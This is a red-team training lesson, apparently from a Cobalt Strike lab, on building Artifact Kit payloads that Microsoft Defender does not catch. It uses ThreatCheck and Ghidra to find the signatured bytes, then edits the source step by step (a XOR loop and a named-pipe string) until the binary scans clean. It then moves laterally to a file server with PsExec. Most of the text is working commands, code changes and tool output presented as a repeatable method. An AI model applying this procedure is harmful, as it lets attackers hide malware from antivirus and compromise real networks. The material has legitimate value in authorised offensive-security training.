

Even though dropping files to disk has a bad reputation, there are instances where it's fairly unavoidable if we want to use certain tactics.  For instance, we can show that we have access to the File Server, but we can't PsExec to it because the default service binary payload is detected by Defender.

 beacon> ls \\fs.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     09/14/2022 15:44:51   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     05/08/2021 08:20:24   PerfLogs
          dir     09/14/2022 15:55:16   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     09/14/2022 15:59:23   ProgramData
          dir     09/14/2022 15:25:23   Recovery
          dir     09/14/2022 15:25:04   System Volume Information
          dir     09/14/2022 15:26:47   Users
          dir     09/14/2022 15:25:15   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     09/14/2022 16:00:25   DumpStack.log.tmp
 1gb      fil     09/14/2022 16:00:25   pagefile.sys

beacon> jump psexec64 fs.dev.cyberbotic.io smb
[-] Could not start service 633af16 on fs.dev.cyberbotic.io: 225

PS C:\Users\Attacker> net helpmsg 225

Operation did not complete successfully because the file contains a virus or potentially unwanted software.


If we copy the payload to our local desktop and check the associated log, we can see that the "file" was detected.



These Cobalt Strike "artifacts" are nothing more than shellcode runners that inject Beacon shellcode when executed.  As a rule of thumb, they inject the shellcode into themselves (e.g. using the VirtualAlloc & CreateThread pattern).  The service binary is the one exception, as it spawns a new process and injects the shellcode into that instead.  This is done so that when moving laterally with PsExec, the artifact can be deleted from disk immediately.

The Artifact Kit contains the source code for these artifacts and is designed to facilitate the development of sandbox-safe injectors.  The idea is to develop artifacts that inject Beacon shellcode in a way that cannot be emulated by AV engines.  There are several bypass techniques provided with the kit which you can modify, or you can implement entirely new ones yourself.  Where the Artifact Kit does not help is with making Beacon resilient to detection once it's running in memory (e.g. from memory scanners).

The kit can be found in C:\Tools\cobaltstrike\arsenal-kit\kits\artifact.

The code for the entry point of each artifact format (i.e. EXE and DLL) can be found in src-main.  These include dllmain.c for the DLL artifacts, main.c for the EXE artifacts, and svcmain.c for the Service EXE artifacts.  These just call a function called start, so you should not need to modify these files in most cases.  The implementation of this function can be found in each bypass file.

These can be found in src-common and are named bypass-<technique>.c.  The included ones are:

    mailslot - reads the shellcode over a mailslot.
    peek - uses a combination of Sleep, PeekMessage and GetTickCount.
    pipe - reads the shellcode over a named pipe.
    readfile - artifact reads itself from disk and seeks to find the embedded shellcode.


Before making any modifications to the kit, let's just build one of these variants as it is.  The kit includes a build script which uses mingw to compile the artifacts.  Running it without any arguments will show the usage.

ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh
[Artifact kit] [-] Usage:
[Artifact kit] [-] ./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
[Artifact kit] [-]  - Techniques       - a space separated list
[Artifact kit] [-]  - Allocator        - set how to allocate memory for the reflective loader.
[Artifact kit] [-]                       Valid values [HeapAlloc VirtualAlloc MapViewOfFile]
[Artifact kit] [-]  - Stage Size       - integer used to set the space needed for the beacon stage.
[Artifact kit] [-]                       For a 0K   RDLL stage size should be 310272 or larger
[Artifact kit] [-]                       For a 5K   RDLL stage size should be 310272 or larger
[Artifact kit] [-]                       For a 100K RDLL stage size should be 444928 or larger
[Artifact kit] [-]  - RDLL Size        - integer used to specify the RDLL size. Valid values [0, 5, 100]
[Artifact kit] [-]  - Resource File    - true or false to include the resource file
[Artifact kit] [-]  - Stack Spoof      - true or false to use the stack spoofing technique
[Artifact kit] [-]  - Syscalls         - set the system call method
[Artifact kit] [-]                       Valid values [none embedded indirect indirect_randomized]
[Artifact kit] [-]  - Output Directory - Destination directory to save the output
[Artifact kit] [-] Example:
[Artifact kit] [-]   ./build.sh "peek pipe readfile" HeapAlloc 310272 5 true true indirect /tmp/dist/artifact


It looks a bit scary at first, but each option is explained in the help.  You can also review the README.md file inside the Artifact Kit directory for more information.  Let's build a new set of artifact templates using the bypass-pipe technique.

ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 310272
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/mnt/c/Tools/cobaltstrike/artifacts/pipe'


Each artifact flavour will be compiled to /mnt/c/Tools/cobaltstrike/artifacts/pipe/ in my case, along with an aggressor script, artifact.cna.

ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ls -l /mnt/c/Tools/cobaltstrike/artifacts/pipe/
total 2044
-rwxrwxrwx 1 ubuntu ubuntu  11914 Nov  6 14:56 artifact.cna*
-rwxrwxrwx 1 ubuntu ubuntu  14336 Nov  6 14:55 artifact32.dll*
-rwxrwxrwx 1 ubuntu ubuntu  14848 Nov  6 14:55 artifact32.exe*
-rwxrwxrwx 1 ubuntu ubuntu 323584 Nov  6 14:55 artifact32big.dll*
-rwxrwxrwx 1 ubuntu ubuntu 324096 Nov  6 14:55 artifact32big.exe*
-rwxrwxrwx 1 ubuntu ubuntu  15360 Nov  6 14:55 artifact32svc.exe*
-rwxrwxrwx 1 ubuntu ubuntu 324608 Nov  6 14:55 artifact32svcbig.exe*
-rwxrwxrwx 1 ubuntu ubuntu  19456 Nov  6 14:56 artifact64.exe*
-rwxrwxrwx 1 ubuntu ubuntu  18432 Nov  6 14:55 artifact64.x64.dll*
-rwxrwxrwx 1 ubuntu ubuntu 328704 Nov  6 14:56 artifact64big.exe*
-rwxrwxrwx 1 ubuntu ubuntu 327680 Nov  6 14:56 artifact64big.x64.dll*
-rwxrwxrwx 1 ubuntu ubuntu  20480 Nov  6 14:56 artifact64svc.exe*
-rwxrwxrwx 1 ubuntu ubuntu 329728 Nov  6 14:56 artifact64svcbig.exe*


The naming convention of these files tell you what they are used for.

    '32/64' denotes 32 and 64bit architectures.
    'big' denotes that it's stageless.
    'svc' denotes that it's a service executable.


Before loading these into Cobalt Strike, it's useful to analyse them with a tool like ThreatCheck.  This will split the file into little chunks and scan them with Defender to reveal any parts that trip static signatures.  Note that ThreatCheck cannot emulate the AV sandbox, so this is for static signatures only.

PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe
[+] Target file size: 329728 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0xBEC
00000000   B9 06 00 00 00 4C 89 E7  4C 8D 05 05 E9 04 00 F3   1····L?çL?··é··ó
00000010   AB 4C 89 E9 C7 84 24 88  00 00 00 68 00 00 00 FF   «L?éÇ?$?···h···ÿ
00000020   15 57 2D 05 00 45 31 C9  45 31 C0 31 C9 4C 89 64   ·W-··E1ÉE1A1ÉL?d
00000030   24 48 4C 89 EA 48 89 6C  24 40 48 C7 44 24 38 00   $HL?êH?l$@HÇD$8·
00000040   00 00 00 48 C7 44 24 30  00 00 00 00 C7 44 24 28   ···HÇD$0····ÇD$(
00000050   04 00 00 00 C7 44 24 20  01 00 00 00 FF 15 8A 2B   ····ÇD$ ····ÿ·?+
00000060   05 00 85 C0 74 32 48 8B  4C 24 70 48 85 C9 74 28   ··?At2H?L$pH?Ét(
00000070   0F 10 44 24 70 48 8D 54  24 50 4C 63 CE 49 89 D8   ··D$pH?T$PLcII?O
00000080   48 8B 84 24 80 00 00 00  0F 11 44 24 50 48 89 44   H??$?·····D$PH?D
00000090   24 60 E8 6E FE FF FF 90  48 81 C4 F8 04 00 00 5B   $`èn_ÿÿ?H?Äo···[
000000A0   5E 5F 5D 41 5C 41 5D C3  57 56 48 83 EC 68 48 8D   ^_]A\A]AWVH?ìhH?
000000B0   35 62 E8 04 00 31 C0 49  89 C9 48 8D 7C 24 20 B9   5bè··1AI?ÉH?|$ 1
000000C0   10 00 00 00 41 89 D2 F3  A5 4C 89 C2 4C 8D 44 24   ····A?Oó¥L?AL?D$
000000D0   20 48 89 C1 83 E1 07 8A  0C 0A 41 30 0C 00 48 FF    H?A?á·?··A0··Hÿ
000000E0   C0 48 83 F8 40 75 EA 31  C0 41 39 C2 7E 12 48 89   AH?o@uê1AA9A~·H?
000000F0   C1 83 E1 07 8A 0C 0A 41  30 0C 01 48 FF C0 EB E9   A?á·?··A0··HÿAëé

  Ensure real-time protection is disabled in Defender before running ThreatCheck against binary artifacts.


Here, we can see that the stageless service binary artifact has something that Defender doesn't like.  However, there's not much context around what this is or where it is in the binary.  Reversing tools such as IDA and Ghidra can help here because it allows us to dissect the file.  Launch Ghidra by running the start script at C:\Tools\ghidra-10.3.1\ghidraRun.bat.  Create a new non-shared project from File > New Project, then import your artifact by going to File > Import File.



Double-click on the imported file to open it in the CodeBrowser.  When prompted, select Yes to analyze the binary (the default selected analyzers are fine).  This may take a minute or so to complete - you will see a progress bar in the bottom-right of the window.

The next task is to find the portion of code reported by ThreatCheck, for which there are two easy ways.  The first is to search for a specific byte sequence output by ThreatCheck, for example C1 83 E1 07 8A 0C 0A 41 30 0C 01 48 FF C0 EB E9.  Go to Search > Memory, paste the string into the search box and click Search All.



Here we have one result.



Clicking on it will take you to the location in the code browser.



The other method is to use the "bad bytes offset" as given by ThreatCheck.  Select Navigation > Go To and enter file(n) where n is the offset.  In this case it would be file(0xBEC).



Unfortunately, we don't have debug symbols for the compiled payloads so function and variables names will be quite generic, like FUN_xxx and lVarx.  However, we can still quite easily see that the portion of highlighted code is a for loop.  We can go back to the Artifact Kit source code and search for any such loops.



We can dismiss most of these files because we didn't use the readfile bypass nor did we enable syscalls.  Therefore, the candidates in patch.c seem the most promising.  Because this is a service binary payload, we know that it will perform a "migration" (i.e. it spawns a new process and injects Beacon shellcode into it before exiting).  This spawn function under an #ifdef _MIGRATE_ directive is a dead ringer for the decompiled version in Ghidra.



To break the detection, we just have to modify the routine so that it compiles to a different byte sequence.  For example:

for (x = 0; x < length; x++) {
    char* ptr = (char *)buffer + x;

    /* do something random */
    GetTickCount();

    *ptr = *ptr ^ key[x % 8];
}


Rebuild the kit and scan the new version of the artifact.  This time we have a different signature - this is an iterative process, so we must repeat these steps until all the detections have been removed.

[!] Identified end of bad bytes at offset 0xE44
00000000   89 C4 31 C0 49 83 FC FF  74 3E 85 DB 7E 1F 49 89   ?Ä1AI?üÿt>?U~·I?
00000010   F9 41 89 D8 48 89 F2 4C  89 E1 48 C7 44 24 20 00   ùA?OH?òL?áHÇD$ ·
00000020   00 00 00 FF 15 FB 29 05  00 85 C0 75 10 4C 89 E1   ···ÿ·û)··?Au·L?á
00000030   FF 15 3E 29 05 00 B8 01  00 00 00 EB 0B 8B 54 24   ÿ·>)··,····ë·?T$
00000040   4C 48 01 D6 29 D3 EB C2  48 83 C4 58 5B 5E 5F 41   LH·Ö)OëAH?ÄX[^_A
00000050   5C C3 41 54 56 53 48 83  EC 20 48 8B 1D 6B EB 04   \AATVSH?ì H?·kë·
00000060   00 48 63 4B 04 E8 22 17  00 00 48 8B 35 F3 29 05   ·HcK·è"···H?5ó)·
00000070   00 49 89 C4 B9 00 04 00  00 FF D6 8B 53 04 4C 89   ·I?Ä1····ÿÖ?S·L?
00000080   E1 E8 2A FF FF FF 85 C0  74 EA 8B 53 04 4C 8D 43   áè*ÿÿÿ?Atê?S·L?C
00000090   08 4C 89 E1 E8 B7 FD FF  FF 4C 89 E1 E8 FB 16 00   ·L?áè·yÿÿL?áèû··
000000A0   00 31 C0 48 83 C4 20 5B  5E 41 5C C3 48 83 EC 68   ·1AH?Ä [^A\AH?ìh
000000B0   FF 15 4E 29 05 00 B9 AA  26 00 00 31 D2 41 B9 5C   ÿ·N)··1ª&··1OA1\
000000C0   00 00 00 F7 F1 C7 44 24  50 5C 00 00 00 C7 44 24   ···÷ñÇD$P\···ÇD$
000000D0   48 65 00 00 00 C7 44 24  40 70 00 00 00 C7 44 24   He···ÇD$@p···ÇD$
000000E0   38 69 00 00 00 C7 44 24  30 70 00 00 00 C7 44 24   8i···ÇD$0p···ÇD$
000000F0   28 5C 00 00 00 C7 44 24  20 2E 00 00 00 41 B8 5C   (\···ÇD$ .···A,\


This one seems related to the sprintf call used to create the pseudo-random pipe name in bypass-pipe.c.



We can get around this one from changing this:

sprintf(pipename, "%c%c%c%c%c%c%c%c%cnetsvc\\%d", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));


To something like this:

sprintf(pipename, "%c%c%c%c%c%c%c%c%crasta\\mouse", 92, 92, 46, 92, 112, 105, 112, 101, 92);


In most cases, it doesn't really matter what you change things to, as long as it's different (and still functional).  With that change, we finally have a clean artifact.

PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe
[+] No threat found!
[*] Run time: 0.72s

  Note that these specific examples may differ as signatures and the Beacon payload changes over time, but this methodology should always get you through.  Each artifact type will also likely have different signatures used to detect them that you'll need to work through.


To tell Cobalt Strike to use these new artifacts, we must load the aggressor script.  Go to Cobalt Strike > Script Manager > Load and select the artifact.cna file in your output directory.  Any DLL and EXE payloads that you generate from hereon will use those new artifacts, so use Payloads > Windows Stageless Generate All Payloads to replace all of your payloads in C:\Payloads.
  It's strongly advised to delete the existing payloads first because they sometimes only get partially overwritten with the new ones.


We should now be able to move laterally to the file server using PsExec.

beacon> jump psexec64 fs.dev.cyberbotic.io smb
Started service 96126c2 on fs.dev.cyberbotic.io

[+] established link to child beacon: 10.10.122.15


Simply unload the CNA from the Script Manager if you want to revert back to the default payloads.
